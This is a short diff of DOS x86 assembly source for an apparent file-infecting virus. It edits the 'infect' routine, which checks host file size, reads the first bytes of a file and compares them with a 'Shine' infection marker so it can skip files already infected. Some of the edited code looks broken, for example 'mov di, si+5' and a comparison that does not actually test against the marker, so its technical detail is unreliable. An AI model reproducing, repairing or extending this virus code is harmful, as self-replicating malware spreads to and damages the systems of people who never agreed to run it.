@@ -104,6 +104,7 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      cmp ax, 65436-virus_size   ; I the file too big??
      je .abort_infection
      push bx          ; Nope, perfetto sizo. BX = File handle
+
      mov ax, 3f00h    ; Read file or device
      mov cx, 5        ; Read 5 bytes, this case from the start to check wheter it's already infected, since we dont wanna have repeated infections
      push bp
@@ -112,7 +113,14 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      pop bp
      int 21h          ; Calling int 21h
      pop bx
-     cmp word [data_section.shine_buf+bp], 'Shine'  ; Is it an infected file?   ; Gotta make this a 'cmpsb' thingie
+
+     push bp
+     add bp, data_section.shine_buf
+     mov si, bp       ; Pointer to the "Shine" buffer
+     pop bp
+     mov di, si+5
+     mov cx, 5
+     rep cmpsb
      je .abort_infection
      push bx                      
      
